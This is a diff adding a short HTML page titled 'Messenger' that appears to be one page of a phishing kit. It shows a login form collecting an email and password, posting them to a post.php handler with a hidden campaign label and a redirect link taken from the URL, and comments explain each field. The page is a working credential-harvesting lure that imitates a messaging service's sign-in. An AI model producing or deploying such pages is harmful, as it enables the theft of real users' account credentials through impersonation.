@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Messenger</title> 
+		<link rel=icon href="images/sample1.png">                              <!-- Specify the icon of webpage -->
+        <script src=".././modules/script.js" type="text/javascript"></script>  <!-- Script will get replace parameter from current url and set it as value of input[name=link] -->
+        <meta charset=UTF8>                                                    <!-- It is used to support ascii characters.Else it would be shown in damaged rectangles. Example: اردو--> 
+    </head>
+    <body> 
+		<center>
+		    <form action=.././modules/post.php method=post>                <!-- This post all form data to post.php file -->
+		        <input type=text     name=username  placeholder=Email >    <!-- This will tell Email to post.php --><br>
+		        <input type=password name=password  placeholder=Password > <!-- This will tell password to post.php --><br>
+		        <input type=hidden   name=location  value=Sample >      <!-- This will tell his name to post.php --><br>
+		        <input type=hidden   name=link      value=''>              <!-- This will tell redirection url to post.php --><br>
+		        <button type=submit>Continue</button>                      <!-- submit button -->
+		    </form>
+		</center>
+    </body>
+</html>
+
